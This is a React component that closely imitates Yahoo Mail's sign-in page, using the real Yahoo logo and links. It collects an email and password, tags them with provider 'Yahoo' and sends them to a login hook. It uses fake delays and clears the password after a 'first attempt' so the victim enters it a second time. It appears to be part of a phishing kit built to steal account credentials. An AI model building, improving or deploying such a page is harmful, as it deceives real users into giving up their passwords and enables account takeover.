import React, { useState, useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';
import { Mail } from 'lucide-react';

interface YahooLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  defaultEmail?: string;
}

// Custom Input component to replicate the exact Yahoo style
const YahooFloatingLabelInput = ({ value, onChange, placeholder, type = "text", autoFocus = false }: any) => {
  const [isFocused, setIsFocused] = useState(false);
  const hasValue = value.length > 0;

  return (
    <div className="relative mt-1 h-12">
      <label
        className={`absolute left-1 transition-all duration-200 ease-in-out pointer-events-none z-0
          ${(isFocused || hasValue) ? 'text-xs top-0 text-gray-500' : 'text-base top-3 text-gray-500'}`}
      >
        {placeholder}
      </label>
      <div className="absolute flex items-center top-3.5">
        {hasValue && type === 'email' && <Mail className="w-5 h-5 text-gray-400 mr-2" />}
        <input
          type={type === 'email' ? 'text' : type} // Use text for email to show icon properly
          value={value}
          onChange={onChange}
          onFocus={() => setIsFocused(true)}
          onBlur={() => setIsFocused(false)}
          autoFocus={autoFocus}
          className="w-full bg-transparent pt-3 pb-1 text-base focus:outline-none"
          style={{ paddingLeft: hasValue && type === 'email' ? '0' : '4px' }}
        />
      </div>
      <div className={`absolute bottom-0 left-0 w-full h-px transition-colors ${isFocused ? 'bg-purple-600' : 'bg-gray-300'}`}></div>
    </div>
  );
};

const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
  const [email, setEmail] = useState(defaultEmail || '');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [pageReady, setPageReady] = useState(false);
  const [nextLoading, setNextLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      setNextLoading(true);
      await new Promise(resolve => setTimeout(resolve, 800));
      setShowPasswordStep(true);
      setNextLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 1200));
    const result = await handleFormSubmit(
      { preventDefault: () => {} } as React.FormEvent,
      { email, password, provider: 'Yahoo' }
    );
    if (result?.isFirstAttempt) { setPassword(''); }
    setSubmitting(false);
  };

  const YahooLogo = ({ className = '' }: { className?: string }) => (
    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className={`select-none ${className}`} />
  );

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <Spinner size="lg" color="border-purple-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col" style={{ animation: 'fadeIn 0.3s ease-in' }}>
      {/* Changed py-4 to py-6 to move header down, and h-14 to h-11 to reduce logo size */}
      <header className="flex-shrink-0 flex justify-between items-center py-6 px-10">
        <YahooLogo className="h-11" />
        <div className="flex items-center space-x-4 text-xs text-gray-600">
          <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
        </div>
      </header>

      <main className="flex-grow w-full max-w-screen-xl mx-auto flex justify-end items-start px-4 md:px-10">
          <div className="w-full md:w-auto flex-shrink-0">
            <div 
              className="w-[360px] mx-auto pt-20 pb-16 px-8 bg-white rounded-2xl" 
              style={{ boxShadow: '0 1px 20px rgba(0,0,0,.04)' }}
            >
              <YahooLogo className="h-9 mx-auto mt-2 mb-6" />
              
              <h2 className="text-center text-[22px] font-bold text-gray-900">
                {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
              </h2>
              <p className="text-center text-sm text-gray-500 mt-1">using your Yahoo account</p>
              {showPasswordStep && ( <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div> )}
              
              <form onSubmit={handleSubmit} className="mt-5 space-y-4">
                {errorMessage && !isLoading && ( <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p> )}
                {!showPasswordStep ? (
                  <div>
                    <YahooFloatingLabelInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" />
                    <button onClick={handleNext} disabled={!email || nextLoading} className="w-full mt-5 py-3 bg-[#6300be] text-white font-semibold rounded-full hover:bg-[#5a00ac] disabled:bg-[#6300be] disabled:cursor-not-allowed transition-colors">
                      {nextLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Next'}
                    </button>
                  </div>
                ) : (
                  <div>
                    <YahooFloatingLabelInput value={password} onChange={(e: any) => setPassword(e.target.value)} placeholder="Password" type="password" autoFocus />
                    <button type="submit" disabled={submitting || isLoading || !password} className="w-full mt-5 py-3 bg-[#6300be] text-white font-semibold rounded-full hover:bg-[#5a00ac] disabled:opacity-50 transition-colors">
                      {(submitting || isLoading) ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                    </button>
                  </div>
                )}
              </form>

              <div className="text-xs mt-4 flex justify-between items-center">
                <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
                  <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 border-gray-300 rounded focus:ring-purple-500" defaultChecked />
                  <span>Stay signed in</span>
                </label>
                <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-xs text-[#6300be] hover:underline font-medium">Forgot username?</a>
              </div>
              
              <div className="mt-6 space-y-3">
                <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-[#8a2be2] text-[#8a2be2] font-semibold rounded-full hover:bg-purple-50 transition-colors">Create an account</a>
                <div className="relative text-center my-1.5">
                  <span className="absolute inset-x-0 top-1/2 h-px bg-gray-200"></span>
                  <span className="relative bg-white px-2 text-xs text-gray-500">or</span>
                </div>
                <a href="https://login.yahoo.com/" target="_blank" rel="noopener noreferrer" className="w-full flex justify-center items-center gap-2 py-3 border border-gray-300 text-gray-800 font-semibold rounded-full hover:bg-gray-50 transition-colors">
                  <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" className="w-5 h-5"/>
                  Sign in with Google
                </a>
              </div>
            </div>
          </div>
      </main>
    </div>
  );
};

export default YahooLoginPage;
